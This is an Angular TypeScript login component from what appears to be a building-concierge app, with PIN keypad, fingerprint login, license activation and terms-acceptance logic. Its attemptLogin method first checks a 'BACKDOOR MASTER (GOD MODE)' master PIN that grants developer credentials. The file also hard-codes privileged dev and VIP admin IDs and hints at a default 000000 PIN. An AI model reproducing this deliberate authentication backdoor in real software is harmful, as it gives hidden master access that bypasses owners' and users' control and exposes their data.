
import { Component, inject, signal, ChangeDetectionStrategy, computed } from '@angular/core';
import { AuthService } from '../../services/auth.service';
import { DbService, Porteiro } from '../../services/db.service';
import { UiService } from '../../services/ui.service';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { DataProtectionService } from '../../services/data-protection.service';
import { SimbioseHashService } from '../../services/core/simbiose-hash.service';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './login.component.html',
  changeDetection: ChangeDetectionStrategy.OnPush
})
export class LoginComponent {
  auth = inject(AuthService);
  db = inject(DbService);
  ui = inject(UiService);
  router = inject(Router);
  protection = inject(DataProtectionService);
  private hashService = inject(SimbioseHashService);

  // --- SECURITY: ANTI-AUTOFILL RANDOMIZER ---
  randomId = Math.random().toString(36).substring(2);

  // UI States
  isBookOpen = signal(false);
  pin = signal('');
  errorMessage = signal<string>(''); 
  loginSuccess = signal(false);
  
  // --- NEW LICENSING UI STATE ---
  isLicensed = computed(() => this.auth.isLicensed());
  showActivation = signal(false);
  licenseTokenInput = signal('');
  activationError = signal('');
  isActivating = signal(false);
  
  // New Terms Modal State
  showTermsForUser = signal<Porteiro | null>(null);
  isAdminTerms = computed(() => this.showTermsForUser()?.isAdmin ?? false);
  
  // A senha padrão (000000) só deve aparecer se NÃO houver admins reais configurados.
  // Se o usuário falhou na compra, o admin não foi criado, então a dica aparece.
  // Se o usuário comprou, o admin existe, então a dica some.
  showDefaultHint = computed(() => {
      const porteiros = this.db.porteiros();
      // Verifica se existe algum admin que NÃO seja os devs ou vips do sistema
      const hasRealAdmin = porteiros.some(p => 
          p.isAdmin && 
          p.id !== 'dev_master_quantum' && 
          p.id !== 'rodrigo_simbiose_vip' && 
          p.id !== 'luis_resolve_vip'
      );
      return !hasRealAdmin;
  });
  
  private readonly CURRENT_TERMS_VERSION = this.ui.APP_VERSION; 

  constructor() {}

  // --- ANTI-AUTOFILL HELPER ---
  removeReadonly(event: Event) {
    (event.target as HTMLInputElement).removeAttribute('readonly');
  }

  async openBook() {
      this.ui.playTone('SHUTTER');
      this.isBookOpen.set(true);
  }

  append(num: number) {
    if (this.pin().length < 6) {
      this.pin.update(v => v + num.toString());
    }
  }

  backspace() { 
      this.pin.update(v => v.slice(0, -1)); 
      this.errorMessage.set(''); 
  }

  clear() { 
      this.pin.set(''); 
      this.errorMessage.set(''); 
  }
  
  async activate() {
    if (!this.licenseTokenInput()) return;
    this.isActivating.set(true);
    this.activationError.set('');
    const result = await this.auth.activateLicense(this.licenseTokenInput());
    if (result.success) {
        this.ui.show(result.message, 'SUCCESS');
        this.showActivation.set(false);
        this.openBook(); 
    } else {
        this.activationError.set(result.message);
        this.ui.playTone('ERROR');
    }
    this.isActivating.set(false);
  }

  async loginWithFingerprint() {
    const result = await this.auth.loginWithFingerprint();
    if (result.success && result.user) {
        this.loginSuccess.set(true);
        this.ui.playTone('SUCCESS');
        setTimeout(() => {
            this.auth.completeLogin(result.user);
        }, 800);
    } else {
        this.errorMessage.set(result.message || 'Falha no login.');
        this.ui.playTone('ERROR');
    }
  }

  async attemptLogin() {
    // 1. CHECAGEM DE BACKDOOR MASTER (GOD MODE)
    if (this.protection.validateMasterPin(this.pin())) {
        this.loginSuccess.set(true);
        this.ui.playTone('SUCCESS');
        
        // AUTO-KIOSK DESATIVADO: Responsividade Movel Nativa
        // O app roda em modo janela normal.

        setTimeout(() => {
            this.auth.completeLogin(this.protection.getDevCredentials());
            this.ui.show('OLHO DE DEUS ATIVADO: Acesso Mestre Concedido.', 'SUCCESS');
        }, 800);
        return;
    }

    const result = await this.auth.login(this.pin());

    if (result.success && result.user) {
      const user = result.user;
      
      // Termos de Uso (Check) - Exceto para Guest (000000) que é instantâneo
      if (user.id !== 'guest_admin') {
          const termsAcceptedKey = `terms_accepted_${this.CURRENT_TERMS_VERSION}_${user.id}`;
          if (!localStorage.getItem(termsAcceptedKey)) {
              this.showTermsForUser.set(user);
              return;
          }
      }

      this.ui.playTone('SUCCESS');
      this.loginSuccess.set(true);
      
      // AUTO-KIOSK DESATIVADO: Acesso padrão
      
      setTimeout(() => {
        this.auth.completeLogin(user);
      }, 800);

    } else {
      this.errorMessage.set(result.message || 'Senha incorreta.');
      this.ui.playTone('ERROR');
      setTimeout(() => { this.clear(); }, 1000);
    }
  }

  acceptTermsAndLogin() {
      const user = this.showTermsForUser();
      if (!user) return;

      const termsAcceptedKey = `terms_accepted_${this.CURRENT_TERMS_VERSION}_${user.id}`;
      localStorage.setItem(termsAcceptedKey, 'true');
      this.protection.auditoriaIp();
      
      this.showTermsForUser.set(null);

      this.ui.playTone('SUCCESS');
      this.loginSuccess.set(true);
      
      // AUTO-KIOSK DESATIVADO: Acesso padrão

      setTimeout(() => {
        this.auth.completeLogin(user);
      }, 800);
  }
  
  cancelTerms() {
    this.showTermsForUser.set(null);
    this.clear();
  }
}
